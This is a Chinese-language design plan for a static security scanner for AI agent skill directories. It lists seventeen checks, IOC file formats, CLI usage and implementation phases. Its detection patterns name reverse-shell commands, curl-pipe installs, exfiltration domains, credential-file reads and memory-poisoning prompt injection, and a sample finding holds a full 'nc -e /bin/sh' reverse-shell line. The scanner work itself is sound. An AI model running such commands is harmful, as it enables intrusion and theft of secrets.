# Skill Security Scanner 改造方案

## 1. 目标

将 `openclaw-security-monitor` 改造为**通用的技能安全扫描器**，核心功能：
- **输入**：用户指定的技能目录路径
- **输出**：安全扫描报告（中文文本 + JSON）
- **定位**：静态代码扫描，不依赖任何平台 CLI

## 2. 简化原则

| 保留 | 移除 |
|------|------|
| 代码模式扫描（grep） | 平台 CLI 调用（`openclaw config`） |
| IOC 数据库匹配 | 平台特定目录（`~/.openclaw/`） |
| SKILL.md 内容检查 | 运行时监控（网络/进程） |
| 通用安全检查（VS Code、MCP） | 平台特定 CVE |
| 病毒库定时更新 | 自动修复功能（remediate） |
| 自排除机制 | Web Dashboard |
| 跨平台兼容（macOS/Linux） | Telegram 通知 |

## 3. 目录结构

```
skill-security-scanner/
├── SKILL.md                          # 技能说明
├── scripts/
│   ├── scan.sh                      # 主扫描脚本
│   ├── update-ioc.sh                # IOC 更新脚本
│   └── setup-auto-update.sh         # 配置 IOC 定时更新（cron）
├── ioc/
│   ├── c2-ips.txt                   # C2 IP 地址
│   ├── malicious-domains.txt        # 恶意域名（含外泄端点）
│   ├── file-hashes.txt              # 恶意文件哈希
│   ├── malicious-skill-patterns.txt # 恶意技能模式
│   └── malicious-publishers.txt     # 恶意发布者
├── logs/                             # 日志目录
└── README.md
```

> **IOC 文件命名与原项目保持一致**，便于直接复用上游数据源。

## 4. 检查项（共 17 项）

### 4.1 检查项列表

| # | 名称 | 检测内容 | 严重性 | 原项目# |
|---|------|---------|--------|---------|
| 1 | C2 基础设施 | 已知恶意 IP 地址 | 严重 | #1 |
| 2 | 恶意软件标记 | AMOS/AuthTool/Stealer 特征 | 严重 | #2 |
| 3 | 反向 Shell | `nc -e`, `/dev/tcp/`, `socat` 等 | 严重 | #3 |
| 4 | 外泄端点 | webhook.site, pipedream, ngrok | 严重 | #4 |
| 5 | 加密钱包 | seed phrase, private key, wallet | 警告 | #5 |
| 6 | Curl-Pipe | `curl \| sh`, `wget \| bash` | 警告 | #6 |
| 7 | SKILL.md 注入 | 恶意安装指令 | 警告 | #9 |
| 8 | 内存投毒 | SOUL.md/MEMORY.md 提示注入 | 严重 | #10 |
| 9 | 环境泄露 | 读取 .env, .ssh, .aws | 警告 | #16 |
| 10 | 明文凭证 | 硬编码 API Key (sk-, AKIA, ghp_) | 警告 | #29 |
| 11 | Base64 混淆 | 隐藏载荷 | 警告 | #11 |
| 12 | 外部二进制 | .exe, .dmg, .pkg 下载 | 警告 | #12 |
| 13 | 恶意模式 | 技能名/发布者黑名单 | 严重 | #15 |
| 14 | 持久化机制 | LaunchAgents, crontab | 警告 | #22 |
| 15 | 文件哈希 | 已知恶意文件 SHA-256（IOC 匹配） | 严重 | 新增 |
| 16 | VS Code 木马 | .vscode/extensions 恶意扩展 | 严重 | #30 |
| 17 | MCP 安全 | mcp.json 提示注入、不安全配置 | 严重 | #32 |

### 4.2 严重性级别说明

| 级别 | 含义 | 退出码 |
|------|------|--------|
| 严重（CRITICAL） | 发现确定性的恶意代码或已知威胁 | 2 |
| 警告（WARNING） | 发现可疑模式，可能是合法用途 | 1 |
| 安全（CLEAN） | 未检测到问题 | 0 |

**退出码规则**（与原项目一致）：
- `0` — 所有检查通过
- `1` — 存在警告但无严重问题
- `2` — 存在严重问题

### 4.3 与原项目 32 项检查的映射

以下原项目检查因依赖平台 CLI 或运行时环境而被**移除**：

| 原项目# | 名称 | 移除原因 |
|---------|------|---------|
| #7 | File Permissions | 依赖 `~/.openclaw/` 特定文件 |
| #8 | Skill Integrity Hashes | 需要预先建立基线，非通用 |
| #13 | Gateway Config | 依赖 `openclaw config get` |
| #14 | WebSocket Security | 依赖运行时 curl 探测 + 特定端口 |
| #17 | DM Policy | 依赖 `openclaw config get` |
| #18 | Tool Policy | 依赖 `openclaw config get` |
| #19 | Sandbox Config | 依赖 `openclaw config get` |
| #20 | mDNS Exposure | 依赖 `openclaw config get` |
| #21 | Session/Cred Perms | 依赖 `~/.openclaw/credentials` |
| #23 | Plugin Audit | 依赖 `~/.openclaw/extensions` |
| #24 | Log Redaction | 依赖 `openclaw config get` |
| #25 | Proxy Bypass | 依赖 openclaw 配置检查 |
| #26 | Exec-Approvals | 依赖 `~/.openclaw/exec-approvals.json` |
| #27 | Docker Security | 依赖 `docker inspect`（运行时） |
| #28 | Node.js CVE | 版本检查，非代码扫描 |
| #31 | Internet Exposure | 依赖 `lsof`（运行时） |

## 5. 命令行接口

```bash
# 基本用法
./scripts/scan.sh <目标目录>

# 示例
./scripts/scan.sh projects/agents/skills/download
./scripts/scan.sh ~/.claude/skills
./scripts/scan.sh /path/to/skills

# 参数
./scripts/scan.sh <目录> --json    # 仅输出 JSON（默认同时输出文本和 JSON）
./scripts/scan.sh <目录> --quiet   # 静默模式（仅输出 JSON 到 stdout）
./scripts/scan.sh <目录> --help    # 帮助

# 更新病毒库
./scripts/update-ioc.sh            # 立即更新
./scripts/update-ioc.sh --check    # 仅检查是否有更新

# 配置定时更新（每日 06:00）
./scripts/setup-auto-update.sh             # 安装 cron 任务
./scripts/setup-auto-update.sh --uninstall # 卸载 cron 任务
```

## 6. 关键实现要点

### 6.1 自排除机制（必须实现）

扫描器自身包含恶意模式的检测字符串（如 `nc -e`、`/dev/tcp/`），必须在所有 grep 扫描中排除自身目录，否则会产生大量误报。

```bash
# 原项目实现方式
SELF_DIR_NAME="$(basename "$(dirname "$(dirname "$0")")")"
grep -rlE "$PATTERN" "$TARGET" --exclude-dir="$SELF_DIR_NAME"
```

### 6.2 跨平台兼容

从原项目复用以下封装：

**超时执行**（scan.sh `run_with_timeout()` 函数）：
```bash
# 优先级：timeout > gtimeout (macOS Homebrew) > python3 subprocess
run_with_timeout() {
    local seconds="$1"; shift
    if command -v timeout &>/dev/null; then
        timeout "$seconds" "$@"
    elif command -v gtimeout &>/dev/null; then
        gtimeout "$seconds" "$@"
    else
        python3 -c "import subprocess,sys; ..." "$seconds" "$@"
    fi
}
```

**跨平台 stat**：
```bash
# macOS 优先，Linux 回退
get_perms() { stat -f "%Lp" "$1" 2>/dev/null || stat -c "%a" "$1" 2>/dev/null; }
```

### 6.3 IOC 数据库加载模式

```bash
# 复用原项目的加载模式：过滤注释和空行，提取第一字段
load_ips() { grep -v '^#' "$IOC_DIR/c2-ips.txt" | grep -v '^$' | cut -d'|' -f1; }
load_domains() { grep -v '^#' "$IOC_DIR/malicious-domains.txt" | grep -v '^$' | cut -d'|' -f1; }
```

### 6.4 输出协议

文本输出采用 `[N/17] 标题` + `STATUS: 描述` 格式，便于下游工具解析：

```
[1/17] Scanning C2 Infrastructure...
CLEAN: No known C2 IPs detected
```

## 7. 输出示例

### 7.1 文本输出（默认，中文）

```
========================================
技能安全扫描 - 2026-02-25 10:30:00
目标: projects/agents/skills/download
扫描器版本: v1.0.0
========================================

[1/17] 扫描 C2 基础设施...
✓ 安全: 未检测到已知 C2 IP

[2/17] 扫描恶意软件标记...
✓ 安全: 未检测到 AMOS/Stealer 特征

[3/17] 扫描反向 Shell...
⚠ 警告: 发现可疑模式
  文件: some-skill/scripts/setup.sh:42

...

========================================
扫描完成: 0 严重, 1 警告, 16 安全
========================================
状态: 安全

详细报告已保存至: logs/scan-2026-02-25.json
```

### 7.2 JSON 输出（AI Agent 友好）

```json
{
  "scan_time": "2026-02-25T10:30:00Z",
  "target_dir": "projects/agents/skills/download",
  "scanner_version": "1.0.0",
  "summary": {
    "critical": 0,
    "warning": 1,
    "safe": 16,
    "total": 17
  },
  "status": "safe",
  "exit_code": 1,
  "checks": [
    {
      "id": 1,
      "name": "c2_infrastructure",
      "status": "safe",
      "detail": "No known C2 IPs detected"
    },
    {
      "id": 3,
      "name": "reverse_shell",
      "status": "warning",
      "detail": "Suspicious pattern found",
      "files": [
        {
          "path": "some-skill/scripts/setup.sh",
          "line": 42,
          "content": "nc -e /bin/sh 192.168.1.1 4444"
        }
      ]
    }
  ]
}
```

## 8. IOC 数据库格式

> 文件命名和格式与原项目保持一致，字段用 `|` 分隔，`#` 开头为注释。

### 8.1 c2-ips.txt

```
# 格式: IP|campaign|first_seen|notes
91.92.242.30|clawhavoc|2026-02-10|AMOS primary C2 server
54.91.154.110|clawhavoc|2026-02-12|Reverse shell endpoint
```

### 8.2 malicious-domains.txt

```
# 格式: domain|type|campaign|notes
webhook.site|exfil|generic|Data exfiltration webhook
pipedream.net|exfil|generic|Data exfiltration service
ngrok.io|tunnel|generic|Reverse tunnel
```

### 8.3 malicious-skill-patterns.txt

```
# 格式: pattern|category|notes
nc -e|reverse-shell|Netcat reverse shell
/dev/tcp/|reverse-shell|Bash TCP redirect
seed.*phrase|crypto|Seed phrase theft
sk-[a-zA-Z0-9]{20,}|api-key|OpenAI API key
```

### 8.4 file-hashes.txt

```
# 格式: hash|filename|platform|family|notes
e3b0c44298fc1c149afbf4c8996fb924...|payload.sh|universal|AMOS|Empty file hash example
```

### 8.5 malicious-publishers.txt

```
# 格式: username|skill_count|campaign|notes
claw-stealer-01|3|clawhavoc|Known malware distributor
```

## 9. 病毒库更新机制

### 9.1 update-ioc.sh 功能

> 注意：原项目的 `update-ioc.sh`（206 行）除了下载更新外，还包含网络连接扫描和已安装技能 IOC 匹配（运行时检查）。改造版仅保留**静态更新功能**，移除运行时检查部分。

保留的功能：
1. 从上游 GitHub 仓库检查更新（hash 对比）
2. 如有更新，备份旧文件后下载新文件
3. 记录更新日志

移除的功能：
- ~~扫描活跃网络连接匹配 C2 IP~~（运行时检查）
- ~~扫描已安装技能匹配 IOC~~（由 scan.sh 负责）

### 9.2 setup-auto-update.sh 功能

> 注意：此脚本对应原项目 `daily-scan-cron.sh` 的 cron 安装部分。原脚本还包含"执行扫描 + Telegram 通知"功能，改造版仅保留 IOC 定时更新。

```bash
# 安装每日 06:00 更新任务
./scripts/setup-auto-update.sh

# 生成的 crontab 条目:
# 0 6 * * * /path/to/skill-security-scanner/scripts/update-ioc.sh >> /path/to/skill-security-scanner/logs/ioc-update.log 2>&1
```

### 9.3 配置项

在 `scripts/update-ioc.sh` 头部可配置：
```bash
# 上游仓库地址（可自定义）
UPSTREAM_REPO="https://raw.githubusercontent.com/xxx/skill-security-scanner/main/ioc"

# 本地 IOC 目录
IOC_DIR="$(dirname "$0")/../ioc"

# 日志文件
LOG_FILE="$(dirname "$0")/../logs/ioc-update.log"
```

## 10. 实施计划

### Phase 1: 基础框架

**任务**：
1. 创建目录结构
2. 编写 `scan.sh` 主脚本框架（含自排除、跨平台兼容）
3. 实现参数解析（`--json`, `--quiet`, `--help`）
4. 实现中文文本输出格式
5. 实现 JSON 输出格式（英文键名，AI Agent 友好）
6. 实现退出码机制（0=clean, 1=warning, 2=critical）
7. 从原项目移植 `run_with_timeout()` 和跨平台 `stat` 封装

**验收**：
- `./scripts/scan.sh <dir>` 正常运行
- `--help` 显示中文帮助
- `--json` 输出英文键名 JSON
- 自排除机制生效（扫描自身不触发误报）

---

### Phase 2: 17 项检查

**任务**：
1. 实现全部 17 项检查（参照原项目对应检查的 grep 模式）
2. 从原项目复制 5 个 IOC 数据库文件
3. 实现结果汇总和报告生成

**验收**：
- 所有 17 项检查正确执行
- 能检测到测试用例中的恶意模式
- 文本报告为中文，JSON 报告使用英文键名
- 退出码正确反映扫描结果

---

### Phase 3: 病毒库更新

**任务**：
1. 实现 `update-ioc.sh` 脚本（仅静态更新，移除运行时检查）
2. 实现 `setup-auto-update.sh` 脚本（仅安装 IOC 更新 cron）
3. 测试定时更新功能

**验收**：
- 手动更新正常工作
- cron 任务正确安装和执行
- `--check` 参数可检查是否有更新

---

### Phase 4: 文档与测试

**任务**：
1. 编写 `SKILL.md`（含 frontmatter）
2. 编写 `README.md`
3. 创建测试用例（包括恶意样本和正常样本）

**验收**：
- 文档清晰完整
- 测试覆盖主要场景
- 扫描自身时不产生误报

## 11. 可复用代码清单

以下原项目代码可直接复用或稍作改造：

| 代码 | 来源文件 | 行号 | 用途 |
|------|---------|------|------|
| `run_with_timeout()` | scan.sh | 52-91 | 跨平台命令超时 |
| `load_ips()` / `load_domains()` | scan.sh | 102-116 | IOC 数据库加载 |
| `log()` / `header()` / `result_*()` | scan.sh | 38-42 | 输出格式化 |
| 检查 #1 C2 IP grep | scan.sh | 118-134 | IP 模式扫描 |
| 检查 #2 AMOS grep | scan.sh | 136-148 | 恶意软件特征匹配 |
| 检查 #3 反向 Shell grep | scan.sh | 150-162 | Shell 模式匹配 |
| 检查 #4 域名 grep | scan.sh | 164-176 | 域名扫描 |
| 检查 #5 加密钱包 grep | scan.sh | 178-190 | 关键词扫描 |
| 检查 #6 Curl-Pipe grep | scan.sh | 192-204 | 管道模式扫描 |
| 检查 #9 SKILL.md 注入 | scan.sh | 251-269 | Prerequisites 注入 |
| 检查 #10 内存投毒 | scan.sh | 271-304 | SOUL/MEMORY 检测 |
| 检查 #11 Base64 混淆 | scan.sh | 306-319 | 解码函数检测 |
| 检查 #12 二进制下载 | scan.sh | 321-334 | 扩展名扫描 |
| 检查 #16 环境泄露 | scan.sh | 446-466 | 敏感文件读取 |
| 检查 #22 持久化机制 | scan.sh | 615-657 | LaunchAgent/crontab |
| 检查 #29 明文凭证 | scan.sh | 841-869 | API 密钥正则 |
| 检查 #30 VS Code 木马 | scan.sh | 871-898 | 扩展目录扫描 |
| 检查 #32 MCP 安全 | scan.sh | 926-952 | mcp.json 检查 |
| `--exclude-dir` 自排除 | scan.sh | 全局 | 避免误报 |
| IOC 全部 5 个文件 | ioc/ | — | 直接复用 |

## 12. 与原始项目的关系

| 原始功能 | 处理方式 |
|---------|---------|
| scan.sh 核心检查 | ✅ 保留 17 项静态检查，参数化路径 |
| remediate.sh + 32 个修复脚本 | ❌ 移除（修复需要用户决策） |
| dashboard.sh | ❌ 移除（过度复杂） |
| network-check.sh | ❌ 移除（运行时监控） |
| update-ioc.sh | ✅ 保留静态更新部分，移除运行时扫描 |
| daily-scan-cron.sh | ⚠️ 部分改造为 setup-auto-update.sh（仅 cron 安装） |
| telegram-setup.sh | ❌ 移除（通知功能） |
| Web Dashboard (server.js + index.html) | ❌ 移除 |
| IOC 数据库 | ✅ 直接复用，文件名保持不变 |
| 32 个检查项 | ⚠️ 精简为 17 个（移除 15 项平台依赖检查） |
| `_common.sh` 共享库 | ❌ 移除（修复脚本专用） |
| 自排除机制 | ✅ 保留 |
| 跨平台兼容封装 | ✅ 保留 |

## 13. 成功标准

1. ✅ 单一脚本，仅依赖 bash 4+、grep、find、shasum
2. ✅ 支持任意目录扫描（不限于特定平台的技能目录）
3. ✅ 全部 17 项检查正常工作
4. ✅ 文本输出为中文，JSON 使用英文键名（AI Agent 友好）
5. ✅ 退出码正确反映扫描结果（0/1/2）
6. ✅ 自排除机制生效，扫描自身不触发误报
7. ✅ 病毒库可手动更新和定时更新
8. ✅ 跨平台兼容（macOS + Linux）
9. ✅ 文档完整

---

## 14. 实施进度

| 阶段 | 状态 | 完成日期 |
|------|------|----------|
| Phase 1: 基础框架 | ✅ 已完成 | 2026-02-25 |
| Phase 2: 17 项检查 | ✅ 已完成 | 2026-02-25 |
| Phase 3: 病毒库更新 | ✅ 已完成 | 2026-02-25 |
| Phase 4: 文档与测试 | ✅ 已完成 | 2026-02-25 |

### 完成内容

- [x] 目录结构创建
- [x] scan.sh 主脚本 (支持 --json, --quiet, --help 参数)
- [x] 自排除机制实现
- [x] 17 项安全检查全部实现
- [x] IOC 数据库文件 (5 个)
- [x] update-ioc.sh 更新脚本
- [x] setup-auto-update.sh 定时更新配置
- [x] SKILL.md 技能文档
